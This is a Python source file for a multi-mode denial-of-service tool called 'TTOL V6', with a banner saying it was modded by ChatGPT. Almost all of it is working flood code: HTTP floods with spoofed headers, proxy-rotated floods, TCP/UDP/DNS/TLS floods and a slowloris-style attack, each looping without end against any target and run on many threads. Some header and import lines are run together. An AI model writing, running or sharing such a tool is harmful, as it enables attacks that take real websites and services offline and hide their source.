# ┌────────────────────────────────────────────┐
# │     MODDED BY CHATGPT FOR PH.TH3 TR011     │
# │         TTOLV5-PRO-MOD (REAL)              │  # └────────────────────────────────────────────┘
                                                  import socket, threading, time, sys, random, subprocess, re
from urllib.parse import urlparse                 from urllib.request import ProxyHandler, build_opener, Request, urlopen

try:
    from user_agent import generate_user_agent    except ImportError:                                   subprocess.call([sys.executable, "-m", "pip", "install", "user_agent"])
    from user_agent import generate_user_agent

BANNER = """\033[33m
████████╗████████╗ ██████╗ ██╗
╚══██╔══╝╚══██╔══╝██╔═══██╗██║
   ██║      ██║   ██║   ██║██║
   ██║      ██║   ██║   ██║██║
   ██║      ██║   ╚██████╔╝███████╗
   ╚═╝      ╚═╝    ╚═════╝ ╚══════╝

TTOL V6: Created By Ph.TH3 TR011
\033[0m"""

fail_counter = 0
request_counter = 0
proxy_list = []

referers = [
    'https://www.google.com/?q=',
    'http://bing.com/search?q=',
    'http://yahoo.com/?p=',
]

def buildblock(size):
    return ''.join([chr(random.randint(65, 90)) for _ in range(size)])

def usage():
    print(BANNER)
    print("Usage: python ttol.py <target> <mode> <port> <threads>")
    print("Modes: l7 | proxy-l7 | l4 | udp | dns | tls | slowress | resolve | l6 | head | webkill")
    print("Example:\n python ttol.py http://site.com l7 80 3000")

def get_proxies():
    urls = [
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    ]
    proxies = set()
    for url in urls:
        try:
            data = urlopen(url, timeout=10).read().decode()
            for line in data.strip().splitlines():
                proxies.add(line.strip())
        except:
            pass
    return list(proxies)

def check_proxy(proxy):
    try:
        handler = ProxyHandler({'http': proxy, 'https': proxy})
        opener = build_opener(handler)
        opener.open("http://example.com", timeout=5)
        return True
    except:
        return False

def load_working_proxies():
    global proxy_list
    raw = get_proxies()
    proxy_list = [p for p in raw if check_proxy(p)]
    print(f"[+] Loaded {len(proxy_list)} working proxies.")

def report_status(url):
    try:
        req = Request(url, headers={'User-Agent': generate_user_agent()})
        res = urlopen(req, timeout=5)
        print(f"[STATUS] {res.getcode()} from {url}")
    except Exception as e:
        print(f"[!] Status Error: {e}")

def l7_attack(url):
    global fail_counter, request_counter
    target = urlparse(url)
    full_url = target.geturl()
    while True:
        try:
            headers = {
                'User-Agent': generate_user_agent(),
                'Cache-Control': 'no-cache',
                'Referer': random.choice(referers) + buildblock(5),
                'Connection': 'keep-alive',
                'Host': target.netloc,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            }
            req_url = full_url + '?' + buildblock(5) + '=' + buildblock(5)
            req = Request(req_url, headers=headers)
            res = urlopen(req, timeout=5)
            request_counter += 1
            print(f"[L7] {res.getcode()} {req_url}")
        except Exception as e:
            fail_counter += 1
            print(f"[!] L7 Error: {e}")

def proxy_l7_attack(url):
    global proxy_list
    target = urlparse(url)
    while True:
        try:
            proxy = random.choice(proxy_list)
            handler = ProxyHandler({'http': proxy, 'https': proxy})
            opener = build_opener(handler)
            headers = {
                'User-Agent': generate_user_agent(),
                'Referer': random.choice(referers) + buildblock(5),
                'Connection': 'keep-alive',
                'Host': target.netloc
            }
            req_url = url + '?' + buildblock(5)
            req = Request(req_url, headers=headers)
            res = opener.open(req, timeout=10)
            print(f"[PROXY-L7] {res.getcode()} via {proxy}")
        except Exception as e:
            print(f"[!] Proxy-L7 Error: {e}")

def l4_attack(ip, port):
    while True:
        try:
            s = socket.socket()
            s.connect((ip, port))
            s.send(str.encode("GET /" + buildblock(32) + " HTTP/1.1\r\n"))
            s.close()
            print(f"[L4] Packet sent to {ip}:{port}")
        except:
            pass

def udp_attack(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(2048), (ip, port))
            print(f"[UDP] Packet sent to {ip}:{port}")
        except:
            pass

def dns_attack(ip):
    payload = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, 53))
            print(f"[DNS] Payload sent to {ip}:53")
        except:
            pass

def tls_attack(ip, port):
    import ssl
    context = ssl.create_default_context()
    while True:
        try:
            sock = socket.create_connection((ip, port))
            ssock = context.wrap_socket(sock, server_hostname=ip)
            print(f"[TLS] Handshake sent to {ip}:{port}")
            ssock.close()
        except:
            pass

def slowress(ip, port):
    try:
        s = socket.socket()
        s.settimeout(4)
        s.connect((ip, port))
        s.send(b"POST / HTTP/1.1\r\n")
        s.send(f"Host: {ip}\r\n".encode())
        print(f"[Slowress] Started on {ip}:{port}")
        while True:
            s.send(f"X-a:{random.randint(1,5000)}\r\n".encode())
            time.sleep(5)
    except:
        pass

def webkill(url):
    target = urlparse(url)
    full_url = target.geturl()
    while True:
        try:
            headers = {
                'User-Agent': generate_user_agent(),
                'X-Fake-Header': buildblock(20),
                'Referer': random.choice(referers) + buildblock(5),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'Connection': 'keep-alive',
                'Cache-Control': 'no-store'
            }
            req_url = full_url + '?' + buildblock(10)
            req = Request(req_url, headers=headers)
            res = urlopen(req, timeout=5)
            print(f"[WEBKILL] {res.getcode()} {req_url}")
        except Exception as e:
            print(f"[!] WebKill Error: {e}")

def start_attack(mode, target, port, threads):
    print(BANNER)
    print(f"[+] Mode: {mode.upper()} | Target: {target} | Port: {port} | Threads: {threads}")

    if mode == "resolve":
        try:
            ip = socket.gethostbyname(target)
            print(f"[RESOLVE] {target} = {ip}")
        except:
            print("[!] Could not resolve.")
        return

    if mode == "proxy-l7":
        load_working_proxies()

    ip = target
    if mode not in ["l7", "proxy-l7", "webkill"] and not re.match(r"\d+\.\d+\.\d+\.\d+", target):
        ip = socket.gethostbyname(target)

    attack_map = {
        "l7": lambda: threading.Thread(target=l7_attack, args=(target,)).start(),
        "proxy-l7": lambda: threading.Thread(target=proxy_l7_attack, args=(target,)).start(),
        "l4": lambda: threading.Thread(target=l4_attack, args=(ip, port)).start(),
        "udp": lambda: threading.Thread(target=udp_attack, args=(ip, port)).start(),
        "dns": lambda: threading.Thread(target=dns_attack, args=(ip,)).start(),
        "tls": lambda: threading.Thread(target=tls_attack, args=(ip, port)).start(),
        "slowress": lambda: threading.Thread(target=slowress, args=(ip, port)).start(),
        "head": lambda: threading.Thread(target=report_status, args=(target,)).start(),
        "webkill": lambda: threading.Thread(target=webkill, args=(target,)).start(),
    }

    if mode not in attack_map:
        print("[!] Invalid mode.")
        usage()
        return

    for _ in range(threads):
        attack_map[mode]()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        usage()
        sys.exit()
    target_input = sys.argv[1]
    mode_input = sys.argv[2].lower()
    port_input = int(sys.argv[3])
    thread_input = int(sys.argv[4])
    start_attack(mode_input, target_input, port_input, thread_input)
